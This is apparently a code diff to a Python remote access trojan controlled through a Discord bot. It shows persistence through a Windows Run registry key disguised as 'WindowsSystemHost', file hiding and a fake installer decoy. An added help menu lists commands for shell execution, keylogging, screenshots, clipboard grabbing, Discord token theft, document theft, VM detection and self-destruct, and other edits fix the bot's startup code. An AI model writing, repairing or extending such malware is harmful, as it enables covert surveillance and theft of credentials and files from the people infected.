@@ -2,7 +2,6 @@
 import os
 import re
 import sys
-import uuid as u
 import time as t
 import json as j
 import ctypes as ct
@@ -28,13 +27,19 @@ from discord.ext import commands, tasks
 
 BOT_TOKEN = ""
 CHANNEL_ID = 
-WEBHOOK_URL = "" 
-import uuid as u
-CLIENT_ID = str(u.uuid4())[:8]
+WEBHOOK_URL = ""
+
+import secrets
+CLIENT_ID = secrets.token_hex(4)
+
+print("✅ CLIENT_ID:", CLIENT_ID)
+
+
 KEYLOG_FILE = f"{CLIENT_ID}_keylog.txt"
 
 keylogger_active = False
-start_time = dat.utcnow()
+from datetime import timezone
+start_time = dat.now(timezone.utc)
 
 p = print
 
@@ -61,13 +66,19 @@ class fakeinstaller:
 class Persistence:
     @staticmethod
     def add_to_startup():
-        if sys.platform != "win32": return
+        if sys.platform != "win32":
+            return
         path = os.path.realpath(sys.argv[0])
         name = "WindowsSystemHost"
-        key = win.OpenKey(win.HKEY_CURRENT_USER,
-                          r"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, win.KEY_SET_VALUE)
+        key = win.OpenKey(
+            win.HKEY_CURRENT_USER,
+            r"Software\Microsoft\Windows\CurrentVersion\Run",
+            0,
+            win.KEY_SET_VALUE
+        )
         win.SetValueEx(key, name, 0, win.REG_SZ, path)
-        win.Close()
+        key.Close()
+
 
     @staticmethod
     def hide_file():
@@ -219,7 +230,7 @@ class RATClient(commands.Cog):
             await ctx.send(f"❌ Error: {str(e)}")
 
     @commands.command()
-    async def screenshot(self, ctx):
+    async def ss(self, ctx):
         path = ScreenshotTool.take_screenshot()
         if path and os.path.exists(path):
             await ctx.send(file=dc.File(path))
@@ -287,13 +298,40 @@ class RATClient(commands.Cog):
         except Exception as e:
             await ctx.send(f"❌ Download failed: {e}")
 
+    @commands.command()
+    async def help(self, ctx):
+        cmds = {
+            "!exec <cmd>": "Execute shell command",
+            "!ss": "Take a screenshot",
+            "!clipboard": "Grab clipboard contents",
+            "!tokens": "Steal Discord tokens",
+            "!system": "Show system info",
+            "!keylog start|stop": "Start/Stop keylogger",
+            "!logs": "Send keylogger logs",
+            "!msgbox <text>": "Send a Windows message box",
+            "!uptime": "Show RAT uptime",
+            "!download <url>": "Download a file from a URL",
+            "!processes": "List running processes",
+            "!listdir <path>": "List files in directory",
+            "!stealfiles": "Steal documents from user's PC",
+            "!antivm": "Detect virtual machines",
+            "!selfdestruct": "Delete and exit RAT"
+        }
+        msg = "**💀 Available Commands:**\n" + "\n".join([f"`{k}` - {v}" for k, v in cmds.items()])
+        await ctx.send(msg)
+
+
+import asyncio
+
 def run_bot():
-    bot = commands.Bot(command_prefix="!", intents=dc.Intents.all())
-    bot.add_cog(RATClient(bot))
-    try:
-        bot.run(BOT_TOKEN)
-    except Exception as e:
-        p("Failed to connect bot:", e)
+    bot = commands.Bot(command_prefix="!", intents=dc.Intents.all(), help_command=None)
+
+    async def setup():
+        await bot.add_cog(RATClient(bot))
+        await bot.start(BOT_TOKEN)
+
+    asyncio.run(setup())
+
 
 def auto_screenshot():
     while True:
@@ -394,8 +432,8 @@ RATClient.selfdestruct = selfdestruct
 def main():
     Persistence.add_to_startup()
     Persistence.hide_file()
-    thr.Thread(target=fakeinstaller().run).start()
-    thr.Thread(target=run_bot).start()
+    fakeinstaller().run()
+    run_bot()
     thr.Thread(target=auto_screenshot).start()
     thr.Thread(target=auto_keylog).start()
 
